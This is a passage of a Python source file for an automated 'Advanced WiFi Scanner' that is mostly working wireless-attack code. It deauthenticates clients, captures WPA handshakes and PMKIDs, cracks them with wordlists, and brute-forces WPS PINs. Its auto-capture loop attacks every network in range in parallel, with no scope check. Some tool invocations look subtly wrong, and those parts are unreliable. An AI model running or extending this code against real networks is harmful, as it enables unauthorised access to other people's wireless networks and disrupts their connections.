                    for pattern in self.wordlist_patterns:
                        f.write(pattern + "\n")
                wordlist_arg = ['--dict', temp_wordlist]
            except Exception as e:
                self.logger.error(f"Error creating wordlist: {e}")
        
        # Adjust arguments based on version
        args = []
        if wifite_version and wifite_version.startswith('2.'):
            # Wifite 2.x has different argument format
            args = ['--interface', iface, '--scan-time', str(scan_time), '--no-wps', '--no-wpa'] + wordlist_arg
        elif wifite_version and re.match(r'^\d+\.', wifite_version):
            # Other versioned wifite
            args = ['-i', iface, '-t', str(scan_time)] + wordlist_arg
        else:
            # Unknown version, try with minimal args
            args = ['-i', iface] + wordlist_arg
        
        # Use timeout if available to prevent hanging
        timeout_path = self.get_tool_path('timeout')
        cmd = []
        if timeout_path:
            cmd = [timeout_path, str(scan_time + 10), wifite_path] + args
        else:
            cmd = [wifite_path] + args
        
        self.logger.info(f"Running wifite command: {' '.join(cmd)}")
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            try:
                stdout, stderr = proc.communicate(timeout=scan_time+15)
                # Combine stdout and stderr for parsing since some versions output to stderr
                output = stdout + "\n" + stderr
            except subprocess.TimeoutExpired:
                self.logger.warning("Wifite scan timed out, killing process")
                proc.kill()
                stdout, stderr = proc.communicate()
                output = stdout + "\n" + stderr
        except Exception as e:
            self.logger.error(f"Error running wifite: {e}")
            output = ""
        
        networks = []
        # Parse wifite output with multiple patterns for different versions
        for line in output.splitlines():
            line = line.strip()
            # Pattern 1: Standard MAC address at start of line
            if re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", line):
                try:
                    parts = line.split()
                    if len(parts) >= 4:
                        bssid = parts[0]
                        # Try to find channel and power in different positions
                        channel = 0
                        power = -100
                        essid = "Hidden"
                        
                        # Look for channel (could be 2nd or 3rd field)
                        for i in range(1, min(4, len(parts))):
                            if parts[i].isdigit() or (parts[i].startswith('0x') and len(parts[i]) > 2):
                                try:
                                    channel = self.normalize_channel(parts[i])
                                    break
                                except:
                                    pass
                        
                        # Look for power (usually has dB or % or just a negative number)
                        for i in range(1, min(5, len(parts))):
                            if 'dB' in parts[i] or '%' in parts[i] or (parts[i].startswith('-') and parts[i][1:].isdigit()):
                                try:
                                    power = self.normalize_signal(parts[i])
                                    break
                                except:
                                    pass
                        
                        # ESSID is usually the last field or fields
                        essid_start = max(1, min(len(parts)-1, 3))
                        essid = self.normalize_essid(' '.join(parts[essid_start:]))
                        
                        network = WiFiNetwork(
                            bssid=bssid,
                            essid=essid,
                            channel=channel,
                            power=power,
                            encryption="Unknown",
                            cipher="Unknown",
                            authentication="Unknown",
                            last_seen=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        )
                        networks.append(network)
                except Exception as e:
                    self.logger.debug(f"Error parsing wifite line: {e}")
            
            # Pattern 2: Some wifite versions use different format with BSSID in brackets
            elif '[' in line and ']' in line and 'ESSID' in line:
                try:
                    bssid_match = re.search(r'\[(([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\]', line)
                    if bssid_match:
                        bssid = bssid_match.group(1)
                        essid_match = re.search(r'ESSID:\s*"(.*)"', line)
                        essid = essid_match.group(1) if essid_match else "Hidden"
                        essid = self.normalize_essid(essid)
                        
                        # Try to extract channel and power
                        channel = 0
                        channel_match = re.search(r'CH\s*(\d+)', line)
                        if channel_match:
                            channel = int(channel_match.group(1))
                        
                        power = -100
                        power_match = re.search(r'(-\d+)\s*dBm', line)
                        if power_match:
                            power = int(power_match.group(1))
                        
                        network = WiFiNetwork(
                            bssid=bssid,
                            essid=essid,
                            channel=channel,
                            power=power,
                            encryption="Unknown",
                            cipher="Unknown",
                            authentication="Unknown",
                            last_seen=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        )
                        networks.append(network)
                except Exception as e:
                    self.logger.debug(f"Error parsing wifite alternative format: {e}")
        
        self.logger.info(f"Found {len(networks)} networks with wifite")
        return networks
    
    def detect_wps_networks(self) -> List[str]:
        """Detect WPS-enabled networks"""
        self.logger.info("Detecting WPS-enabled networks")
        
        if not self.ensure_monitor_mode():
            return []
        
        success, stdout, _ = self.run_command(f"timeout 30 airodump-ng {self.monitor_interface} --wps")
        
        wps_networks = []
        # Parse WPS networks from output
        for line in stdout.split('\n'):
            if 'WPS' in line:
                # Extract BSSID from line
                bssid_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                if bssid_match:
                    wps_networks.append(bssid_match.group())
        
        return wps_networks
    
    def verify_handshake(self, cap_file: str, bssid: str) -> bool:
        """Verify if the handshake in the .cap file is complete and crackable by aircrack-ng, with detailed checks"""
        command = f"aircrack-ng -a2 -b {bssid} {cap_file}"
        success, stdout, stderr = self.run_command(command, operation_type="scan")
        # Check for aircrack-ng handshake indicators
        handshake_found = False
        handshake_details = []
        for line in stdout.splitlines():
            if "handshake" in line.lower() or "WPA handshake" in line:
                handshake_found = True
                handshake_details.append(line)
            if "EAPOL" in line or "WPA key" in line or "Message 1" in line or "Message 2" in line or "Message 3" in line or "Message 4" in line:
                handshake_details.append(line)
        if handshake_found:
            self.logger.info(f"Valid handshake found for {bssid} in {cap_file}")
            for detail in handshake_details:
                self.logger.info(f"Handshake detail: {detail}")
            return True
        else:
            self.logger.warning(f"No valid handshake found for {bssid} in {cap_file}")
            for detail in handshake_details:
                self.logger.warning(f"Handshake detail: {detail}")
            return False

    def deauth_network(self, network: WiFiNetwork, count: int = 5) -> bool:
        """Deauthenticate clients from a network using all available Kali Linux tools (aireplay-ng, mdk3, mdk4, wifite, wlan-hammer)"""
        self.logger.info(f"Deauthenticating network {network.essid} ({network.bssid}) with all available tools")
        if not self.ensure_monitor_mode():
            return False
        # Try aireplay-ng
        aireplay_cmd = f"aireplay-ng -0 {count} -a {network.bssid} {self.monitor_interface}"
        success, stdout, stderr = self.run_command(aireplay_cmd, operation_type="deauth")
        if success:
            self.logger.info(f"Deauth sent with aireplay-ng for {network.essid}")
            self.logger.info(f"[+] Deauth sent with aireplay-ng for {network.essid} ({network.bssid})")
            return True
        # Try mdk3
        mdk3_cmd = f"mdk3 {self.monitor_interface} d -c {network.channel}"
        success, stdout, stderr = self.run_command(mdk3_cmd, operation_type="deauth")
        if success:
            self.logger.info(f"Deauth sent with mdk3 for {network.essid}")
            self.logger.info(f"[+] Deauth sent with mdk3 for {network.essid} ({network.bssid})")
            return True
        # Try mdk4
        mdk4_cmd = f"mdk4 {self.monitor_interface} d -c {network.channel}"
        success, stdout, stderr = self.run_command(mdk4_cmd, operation_type="deauth")
        if success:
            self.logger.info(f"Deauth sent with mdk4 for {network.essid}")
            self.logger.info(f"[+] Deauth sent with mdk4 for {network.essid} ({network.bssid})")
            return True
        # Try wifite
        wifite_cmd = f"wifite --deauth {network.bssid} --interface {self.monitor_interface} --channel {network.channel}"
        success, stdout, stderr = self.run_command(wifite_cmd, operation_type="deauth")
        if success:
            self.logger.info(f"Deauth sent with wifite for {network.essid}")
            self.logger.info(f"[+] Deauth sent with wifite for {network.essid} ({network.bssid})")
            return True
        # Try wlan-hammer
        wlanhammer_cmd = f"wlan-hammer --deauth --bssid {network.bssid} --iface {self.monitor_interface} --channel {network.channel}"
        success, stdout, stderr = self.run_command(wlanhammer_cmd, operation_type="deauth")
        if success:
            self.logger.info(f"Deauth sent with wlan-hammer for {network.essid}")
            self.logger.info(f"[+] Deauth sent with wlan-hammer for {network.essid} ({network.bssid})")
            return True
        self.logger.warning(f"Failed to deauth {network.essid} with all tools")
        self.logger.warning(f"[-] Failed to deauth {network.essid} ({network.bssid}) with all tools")
        return False

    def capture_handshake(self, network: WiFiNetwork, timeout: int = None) -> bool:
        """Capture WPA/WPA2 handshake for a specific network and verify it with detailed checks, using all deauth tools"""
        self.logger.info(f"Attempting to capture handshake for {network.essid} ({network.bssid})")
        if not self.ensure_monitor_mode():
            return False
        output_file = os.path.join(self.output_dir, f"handshake_{network.bssid.replace(':', '')}")
        airodump_cmd = f"airodump-ng {self.monitor_interface} --bssid {network.bssid} -c {network.channel} -w {output_file}"
        try:
            # Get timeout value from timeouts dictionary if not explicitly provided
            if timeout is None:
                timeout = self.timeouts.get("handshake", self.timeouts["default"])
            
            # Use timeout command if available
            timeout_cmd = self.get_tool_path('timeout')
            if timeout_cmd:
                cmd = f"{timeout_cmd} {timeout} {airodump_cmd}"
            else:
                cmd = airodump_cmd
            
            airodump_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(5)
            self.deauth_network(network)
            
            # Wait for the process to complete or timeout
            try:
                airodump_process.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                airodump_process.terminate()
                
            cap_file = f"{output_file}-01.cap"
            if os.path.exists(cap_file):
                if self.verify_handshake(cap_file, network.bssid):
                    self.logger.info(f"Handshake captured and verified for {network.essid}")
                    self.logger.info(f"[+] Handshake captured and verified for {network.essid} ({network.bssid})")
                    return True
                else:
                    self.logger.warning(f"Handshake file exists but not valid for {network.essid}")
                    self.logger.warning(f"[-] Handshake file exists but not valid for {network.essid} ({network.bssid})")
                    return False
            self.logger.warning(f"Failed to capture handshake for {network.essid}")
            self.logger.warning(f"[-] Failed to capture handshake for {network.essid} ({network.bssid})")
            return False
        except Exception as e:
            self.logger.error(f"Error capturing handshake: {e}")
            self.logger.error(f"[-] Error capturing handshake for {network.essid} ({network.bssid}): {e}")
            return False
    
    def capture_pmkid(self, network: WiFiNetwork, timeout: int = None) -> Optional[str]:
        """Capture PMKID for a specific network using hcxdumptool and extract with hcxpcapngtool"""
        self.logger.info(f"Attempting PMKID capture for {network.essid} ({network.bssid})")
        if not self.ensure_monitor_mode():
            return None
        pcapng_file = os.path.join(self.output_dir, f"pmkid_{network.bssid.replace(':', '')}.pcapng")
        hcxdumptool_cmd = f"hcxdumptool -i {self.monitor_interface} -o {pcapng_file} --enable_status=1 --filterlist_ap={network.bssid} --active_beacon"
        success, stdout, stderr = self.run_command(hcxdumptool_cmd, operation_type="handshake")
        if not success:
            self.logger.warning(f"hcxdumptool failed: {stderr}")
            return None
        pmkid_hash_file = os.path.join(self.output_dir, f"pmkid_{network.bssid.replace(':', '')}.hash")
        hcxpcapngtool_cmd = f"hcxpcapngtool -o {pmkid_hash_file} {pcapng_file}"
        success, stdout, stderr = self.run_command(hcxpcapngtool_cmd, operation_type="default")
        if success and os.path.exists(pmkid_hash_file):
            self.logger.info(f"PMKID hash file created: {pmkid_hash_file}")
            return pmkid_hash_file
        else:
            self.logger.warning(f"No PMKID found for {network.essid}")
            return None

    def crack_pmkid(self, network: WiFiNetwork, pmkid_hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> Optional[str]:
        """Crack PMKID hash using hashcat"""
        self.logger.info(f"Attempting to crack PMKID for {network.essid} ({network.bssid}) with wordlist: {wordlist}")
        hashcat_cmd = f"hashcat -m 16800 {pmkid_hash_file} {wordlist} --force --quiet"
        success, stdout, stderr = self.run_command(hashcat_cmd, operation_type="crack")
        password = None
        if os.path.exists(self.hashcat_potfile):
            with open(self.hashcat_potfile, "r") as f:
                for line in f:
                    if network.bssid.replace(":", "").lower() in line:
                        parts = line.strip().split(":")
                        if len(parts) > 1:
                            password = parts[-1]
                            break
        if password:
            self.logger.info(f"PMKID password cracked for {network.essid}: {password}")
            self.logger.info(f"[+] PMKID password cracked for {network.essid} ({network.bssid}): {password}")
            return password
        else:
            self.logger.info(f"No PMKID password found for {network.essid}")
            return None

    def attack_wps_network(self, network: WiFiNetwork) -> Optional[str]:
        """Attack WPS-enabled network using all available Kali Linux tools (Reaver, Bully, Wifite, OneShot, pixiewps, wpscrack, wpscan, wpspin, wpsbrute)"""
        self.logger.info(f"Attacking WPS network {network.essid} ({network.bssid}) with all available tools")
        if not self.ensure_monitor_mode():
            return None
        pin = None
        # Try Reaver
        reaver_cmd = f"reaver -i {self.monitor_interface} -b {network.bssid} -vv"
        success, stdout, _ = self.run_command(reaver_cmd, operation_type="wps")
        if "WPS PIN:" in stdout or "[+] Pin cracked:" in stdout:
            pin_match = re.search(r"WPS PIN: ([0-9]+)|\[\+\] Pin cracked: ([0-9]+)", stdout)
            if pin_match:
                # Safely extract group - check if group exists before accessing
                pin = None
                if pin_match.group(1):
                    pin = pin_match.group(1)
                elif pin_match.group(2):
                    pin = pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with Reaver: {pin}")
                return pin
        # Try Bully
        bully_cmd = f"bully -b {network.bssid} -c {network.channel} {self.monitor_interface}"
        success, stdout, _ = self.run_command(bully_cmd, operation_type="wps")
        if "PIN:" in stdout or "WPS pin:" in stdout:
            pin_match = re.search(r"PIN: ([0-9]+)|WPS pin: ([0-9]+)", stdout)
            if pin_match:
                # Safely extract group - check if group exists before accessing
                pin = None
                if pin_match.group(1):
                    pin = pin_match.group(1)
                elif pin_match.group(2):
                    pin = pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with Bully: {pin}")
                return pin
        # Try Wifite
        wifite_cmd = f"wifite --wps --interface {self.monitor_interface} --bssid {network.bssid} --channel {network.channel}"
        success, stdout, _ = self.run_command(wifite_cmd, operation_type="wps")
        if "WPS PIN:" in stdout or "WPS pin:" in stdout:
            pin_match = re.search(r"WPS PIN: ([0-9]+)|WPS pin: ([0-9]+)", stdout)
            if pin_match:
                # Safely extract group - check if group exists before accessing
                pin = None
                if pin_match.group(1):
                    pin = pin_match.group(1)
                elif pin_match.group(2):
                    pin = pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with Wifite: {pin}")
                return pin
        # Try OneShot
        oneshot_cmd = f"oneshot -i {self.monitor_interface} -b {network.bssid} -c {network.channel}"
        success, stdout, _ = self.run_command(oneshot_cmd, operation_type="wps")
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                # Safely extract group - check if group exists before accessing
                pin = None
                if pin_match.group(1):
                    pin = pin_match.group(1)
                elif pin_match.group(2):
                    pin = pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with OneShot: {pin}")
                return pin
        # Try pixiewps (requires pin from previous step, so only runs if pin is found)
        pixiewps_cmd = f"pixiewps -e {network.bssid} -s {network.essid}"
        success, stdout, _ = self.run_command(pixiewps_cmd, operation_type="wps")
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                # Safely extract group - check if group exists before accessing
                pin = None
                if pin_match.group(1):
                    pin = pin_match.group(1)
                elif pin_match.group(2):
                    pin = pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with pixiewps: {pin}")
                return pin
        # Try wpscrack
        wpscrack_cmd = f"wpscrack -i {self.monitor_interface} -b {network.bssid}"
        success, stdout, _ = self.run_command(wpscrack_cmd, operation_type="wps")
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                # Safely extract group - check if group exists before accessing
                pin = None
                if pin_match.group(1):
                    pin = pin_match.group(1)
                elif pin_match.group(2):
                    pin = pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with wpscrack: {pin}")
                return pin
        # Try wpscan
        wpscan_cmd = f"wpscan -i {self.monitor_interface} -b {network.bssid}"
        success, stdout, _ = self.run_command(wpscan_cmd, operation_type="wps")
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                # Safely extract group - check if group exists before accessing
                pin = None
                if pin_match.group(1):
                    pin = pin_match.group(1)
                elif pin_match.group(2):
                    pin = pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with wpscan: {pin}")
                return pin
        # Try wpspin
        wpspin_cmd = f"wpspin -i {self.monitor_interface} -b {network.bssid}"
        success, stdout, _ = self.run_command(wpspin_cmd, operation_type="wps")
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                # Safely extract group - check if group exists before accessing
                pin = None
                if pin_match.group(1):
                    pin = pin_match.group(1)
                elif pin_match.group(2):
                    pin = pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with wpspin: {pin}")
                return pin
        # Try wpsbrute
        wpsbrute_cmd = f"wpsbrute -i {self.monitor_interface} -b {network.bssid}"
        success, stdout, _ = self.run_command(wpsbrute_cmd, operation_type="wps")
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                # Safely extract group - check if group exists before accessing
                pin = None
                if pin_match.group(1):
                    pin = pin_match.group(1)
                elif pin_match.group(2):
                    pin = pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with wpsbrute: {pin}")
                return pin
        self.logger.warning(f"Failed to crack WPS for {network.essid} with all tools")
        self.logger.warning(f"[-] Failed to crack WPS for {network.essid} ({network.bssid}) with all tools")
        return None

    def generate_custom_wordlist(self, network: WiFiNetwork) -> str:
        """Generate a custom wordlist based on ESSID, BSSID, and common patterns"""
        wordlist_path = os.path.join(self.output_dir, f"custom_wordlist_{network.bssid.replace(':', '')}.txt")
        essid = network.essid
        bssid = network.bssid.replace(':', '')
        candidates = set()
        # ESSID variations
        if essid and essid != "Hidden":
            candidates.add(essid)
            candidates.add(essid.lower())
            candidates.add(essid.upper())
            candidates.add(essid + "123")
            candidates.add(essid + "1234")
            candidates.add(essid + "2025")
            candidates.add(essid + "2024")
            candidates.add(essid + "2023")
            candidates.add(essid + "home")
            candidates.add(essid + "wifi")
            candidates.add(essid + "net")
            candidates.add(essid + "secure")
            candidates.add(essid + "1")
            candidates.add(essid + "12")
            candidates.add(essid + "12345")
            candidates.add(essid + "007")
            candidates.add(essid + "@123")
            candidates.add(essid + "!")
            candidates.add(essid + "#")
            candidates.add(essid + "$")
            candidates.add(essid + "*")
            candidates.add(essid[::-1])
            # Leet speak
            leet = essid.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '5')
            candidates.add(leet)
        # BSSID variations
        candidates.add(bssid)
        candidates.add(bssid[-6:])
        candidates.add(bssid[-4:])
        candidates.add(essid + bssid[-4:])
        candidates.add(essid + bssid[-6:])
        candidates.add(essid + "_" + str(network.channel))
        candidates.add(essid + "-" + bssid[-4:])
        # Common passwords
        candidates.update([
            "password", "admin", "qwerty", "letmein", "iloveyou", "welcome", "12345678", "123456789", "987654321", "default",
            "wifipassword", "mywifi", "internet", "wireless", "router", "modem", "accesspoint",
            "family", "guest", "office", "work", "school", "college",
            "superman", "batman", "pokemon", "dragon", "football", "cricket", "soccer",
            "summer", "winter", "spring", "autumn", "holiday", "vacation",
            "123456", "654321", "111111", "222222", "333333", "444444", "555555", "666666", "777777", "888888", "999999",
            "000000", "123123", "321321", "112233", "445566", "789789"
        ])
        # Channel/Power
        candidates.add(str(network.channel))
        candidates.add(str(network.power))
        # Combination patterns
        candidates.add(essid + "!2025")
        candidates.add(essid + "#2025")
        candidates.add(essid + "*2025")
        candidates.add(essid + "2025!")
        candidates.add(essid + "2025#")
        candidates.add(essid + "2025*")
        candidates.add(essid + "_" + str(network.channel))
        candidates.add(essid + "-" + str(network.channel))
        candidates.add(essid + "_" + str(network.power))
        candidates.add(essid + "-" + str(network.power))
        # Write to file
        with open(wordlist_path, "w") as f:
            for word in candidates:
                f.write(word + "\n")
        self.logger.info(f"Custom wordlist generated: {wordlist_path} ({len(candidates)} entries)")
        return wordlist_path

    def crack_handshake(self, network: WiFiNetwork, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> Optional[str]:
        """Attempt to crack WPA/WPA2 handshake using aircrack-ng and a wordlist, fallback to custom wordlist if default fails"""
        self.logger.info(f"Attempting to crack handshake for {network.essid} ({network.bssid}) with wordlist: {wordlist}")
        
        # Check if wordlist exists
        if not os.path.exists(wordlist):
            self.logger.warning(f"Wordlist {wordlist} does not exist. Generating custom wordlist instead.")
            wordlist = self.generate_custom_wordlist(network)
        cap_file = os.path.join(self.output_dir, f"handshake_{network.bssid.replace(':', '')}-01.cap")
        if not os.path.exists(cap_file):
            self.logger.warning(f"Handshake file not found: {cap_file}")
            return None
        # Try default wordlist
        command = f"aircrack-ng -w {wordlist} -b {network.bssid} {cap_file}"
        success, stdout, stderr = self.run_command(command, operation_type="crack")
        if success:
            match = re.search(r'KEY FOUND! \[ (.+) \]', stdout)
            if match:
                password = match.group(1)
                self.logger.info(f"Password cracked for {network.essid}: {password}")
                self.logger.info(f"[+] Password cracked for {network.essid} ({network.bssid}): {password}")
                return password
            else:
                self.logger.info(f"No password found for {network.essid} with default wordlist. Trying custom wordlist...")
        else:
            self.logger.error(f"Error cracking handshake: {stderr}")
        # Try custom wordlist
        custom_wordlist = self.generate_custom_wordlist(network)
        command = f"aircrack-ng -w {custom_wordlist} -b {network.bssid} {cap_file}"
        success, stdout, stderr = self.run_command(command, operation_type="wps")
        if success:
            match = re.search(r'KEY FOUND! \[ (.+) \]', stdout)
            if match:
                password = match.group(1)
                self.logger.info(f"Password cracked for {network.essid} with custom wordlist: {password}")
                self.logger.info(f"[+] Password cracked for {network.essid} ({network.bssid}): {password}")
                return password
            else:
                self.logger.info(f"No password found for {network.essid} with custom wordlist")
        else:
            self.logger.error(f"Error cracking handshake with custom wordlist: {stderr}")
        return None
    
    def comprehensive_scan(self) -> Dict[str, WiFiNetwork]:
        """Perform comprehensive scan using multiple tools"""
        self.logger.info("Starting comprehensive WiFi scan")
        
        all_networks = {}
        
        # Use multiple scanning methods
        for tool_name, scan_func in self.scanning_tools.items():
            try:
                self.logger.info(f"Scanning with {tool_name}")
                networks = scan_func()
                
                for network in networks:
                    if network.bssid in all_networks:
                        # Merge network information
                        existing = all_networks[network.bssid]
                        if network.power > existing.power:
                            existing.power = network.power
                        if network.essid != "Hidden" and existing.essid == "Hidden":
                            existing.essid = network.essid
                    else:
                        all_networks[network.bssid] = network
                
            except Exception as e:
                self.logger.error(f"Error with {tool_name}: {e}")
                continue
        
        # Detect WPS networks
        wps_networks = self.detect_wps_networks()
        for bssid in wps_networks:
            if bssid in all_networks:
                all_networks[bssid].wps = True
        
        self.networks = all_networks
        self.logger.info(f"Comprehensive scan completed. Found {len(all_networks)} unique networks")
        
        return all_networks
    
    def auto_capture_with_retry(self, max_runtime=3600):
        """Automatically capture networks with improved retry logic, parallelization, and adaptive scan duration
        
        Args:
            max_runtime: Maximum runtime in seconds (default: 1 hour)
        """
        self.logger.info("Starting automatic capture with robust retry logic, parallelization, and adaptive scan duration")
        self.logger.info(f"Maximum runtime set to {max_runtime} seconds")
        self.running = True
        start_time = time.time()

        def attack_task(network):
            attempt = network.attempts
            while attempt < self.max_attempts and self.running:
                network.attempts = attempt + 1
                self.logger.info(f"Attempt {network.attempts}/{self.max_attempts} for {network.essid} ({network.bssid})")
                success = False
                password = None
                # Try WPS attack if available
                if network.wps:
                    password = self.attack_wps_network(network)
                    success = bool(password)
                    if success:
                        network.password = password
                # Try handshake capture for WPA/WPA2
                if not success and network.encryption in ['WPA', 'WPA2', 'WPA/WPA2']:
                    success = self.capture_handshake(network)
                    network.handshake_captured = success
                    # Attempt to crack handshake if captured
                    if success and hasattr(self, 'wordlist') and getattr(self, 'wordlist', None):
                        password = self.crack_handshake(network, self.wordlist)
                        if password:
                            network.password = password
                if success:
                    self.logger.info(f"Successfully captured {network.essid}")
                    break  # Stop retrying this network
                else:
                    self.logger.warning(f"Failed to capture {network.essid} (attempt {network.attempts})")
                    # Adaptive delay: increase wait time with each failed attempt
                    delay = 10 + (attempt * 5)
                    self.logger.info(f"Waiting {delay} seconds before next attempt for {network.essid}")
                    time.sleep(delay)
                    attempt += 1

        while self.running:
            # Check if we've exceeded the maximum runtime
            if time.time() - start_time > max_runtime:
                self.logger.warning(f"Maximum runtime of {max_runtime} seconds exceeded. Stopping auto capture.")
                self.running = False
                break
                
            # Adaptive scan duration logic
            base_duration = self.scan_duration if hasattr(self, 'scan_duration') else 30
            # Perform a quick scan to estimate network density
            quick_networks = self.comprehensive_scan()
            num_networks = len(quick_networks)
            # Adjust scan duration: fewer networks = longer scan, more networks = shorter scan
            if num_networks <= 3:
                scan_duration = max(base_duration, 60)
            elif num_networks <= 8:
                scan_duration = max(int(base_duration * 1.5), 45)
            elif num_networks <= 15:
                scan_duration = base_duration
            else:
                scan_duration = max(int(base_duration * 0.7), 15)
            self.logger.info(f"Adaptive scan duration set to {scan_duration} seconds (found {num_networks} networks)")

            # Update scan_duration for all scan methods
            self.scan_duration = scan_duration
            networks = self.comprehensive_scan()

            # Sort networks by signal strength
            sorted_networks = sorted(networks.values(), key=lambda x: x.power, reverse=True)

            # Run attack/capture tasks in parallel, each network gets full retry loop
            with ThreadPoolExecutor(max_workers=4) as executor:
                futures = [executor.submit(attack_task, network) for network in sorted_networks]
                for future in as_completed(futures):
                    pass  # Results are handled in attack_task

            # Save results
            self.save_results()

            # Wait before next scan cycle
            if self.running:
                self.logger.info("Waiting before next scan cycle...")
                time.sleep(60)
    
    def save_results(self):
        """Save scan results to JSON file"""
        results_file = os.path.join(self.output_dir, f"scan_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        
        results = {
            'scan_time': datetime.now().isoformat(),
            'interface': self.interface,
            'networks': [asdict(network) for network in self.networks.values()]
        }
        
        try:
            with open(results_file, 'w') as f:
                json.dump(results, f, indent=2)
            
            self.logger.info(f"Results saved to {results_file}")
            
        except Exception as e:
            self.logger.error(f"Error saving results: {e}")
    
    def generate_report(self):
        """Generate comprehensive HTML report with symbolic visualization"""
        report_file = os.path.join(self.output_dir, f"wifi_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")

        # Symbolic icons (Unicode)
        wps_icon = "🔒"
        handshake_icon = "🤝"
        handshake_fail_icon = "❌"
        signal_icons = ["📶", "📶📶", "📶📶📶", "📶📶📶📶"]

        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>WiFi Scan Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
                .wps {{ background-color: #ffeb3b; }}
                .captured {{ background-color: #4caf50; color: white; }}
            </style>
        </head>
        <body>
            <h1>WiFi Scan Report</h1>
            <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Interface: {self.interface}</p>
            <p>Total Networks: {len(self.networks)}</p>

            <table>
                <tr>
                    <th>ESSID</th>
                    <th>BSSID</th>
                    <th>Channel</th>
                    <th>Power</th>
                    <th>Signal</th>
                    <th>Encryption</th>
                    <th>WPS</th>
                    <th>Handshake</th>
                    <th>Attempts</th>
                </tr>
        """

        for network in sorted(self.networks.values(), key=lambda x: x.power, reverse=True):
            row_class = ""
            if network.wps:
                row_class += "wps "
            if network.handshake_captured:
                row_class += "captured"

            # Signal strength visualization
            if network.power >= -50:
                signal_icon = signal_icons[3]
            elif network.power >= -65:
                signal_icon = signal_icons[2]
            elif network.power >= -80:
                signal_icon = signal_icons[1]
            else:
                signal_icon = signal_icons[0]

            # WPS visualization
            wps_vis = wps_icon if network.wps else ""
            # Handshake visualization
            handshake_vis = handshake_icon if network.handshake_captured else handshake_fail_icon

            html_content += f"""
                <tr class='{row_class}'>
                    <td>{network.essid}</td>
                    <td>{network.bssid}</td>
                    <td>{network.channel}</td>
                    <td>{network.power}</td>
                    <td>{signal_icon}</td>
                    <td>{network.encryption}</td>
                    <td>{wps_vis}</td>
                    <td>{handshake_vis}</td>
                    <td>{network.attempts}</td>
                </tr>
            """

        html_content += """
            </table>
        </body>
        </html>
        """

        try:
            with open(report_file, 'w') as f:
                f.write(html_content)

            self.logger.info(f"HTML report generated: {report_file}")

        except Exception as e:
            self.logger.error(f"Error generating report: {e}")
    
    def cleanup(self):
        """Cleanup resources and stop monitor mode"""
        self.logger.info("Cleaning up...")
        self.running = False
        
        if self.monitor_mode_active:
            self.stop_monitor_mode()
        
        # Generate final report
        if self.networks:
            self.save_results()
            self.generate_report()
        
        self.logger.info("Cleanup completed")

def main():
    """Main function with argument parsing"""
    parser = argparse.ArgumentParser(description="Advanced WiFi Scanner for Kali Linux")
    parser.add_argument("-i", "--interface", default="wlan0", help="Wireless interface to use")
    parser.add_argument("-o", "--output", default="./wifi_scan_results", help="Output directory")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Scan duration per tool")
    parser.add_argument("-a", "--attempts", type=int, default=3, help="Max attempts per network")  # <-- FIXED
    parser.add_argument("-w", "--wordlist", default="/usr/share/wordlists/rockyou.txt", help="Path to wordlist for cracking handshakes")
    parser.add_argument("--scan-only", action="store_true", help="Only scan, don't attack")
    parser.add_argument("--no-monitor", action="store_true", help="Don't use monitor mode")
    parser.add_argument("--gui", action="store_true", help="Launch the PyQt5 GUI")
    parser.add_argument("--dry-run", action="store_true", help="Run in dry-run mode (simulate commands without executing them)")
    args = parser.parse_args()
    
    # If GUI mode requested, launch PyQt5 GUI
    if args.gui:
        try:
            from PyQt5 import QtWidgets, QtCore
        except ImportError:
            logging.error("PyQt5 is not installed. Please install it with 'pip install PyQt5'.")
            sys.exit(1)

        class WiFiScannerGUI(QtWidgets.QMainWindow):
            def __init__(self):
                super().__init__()
                self.setWindowTitle("Advanced WiFi Scanner GUI")
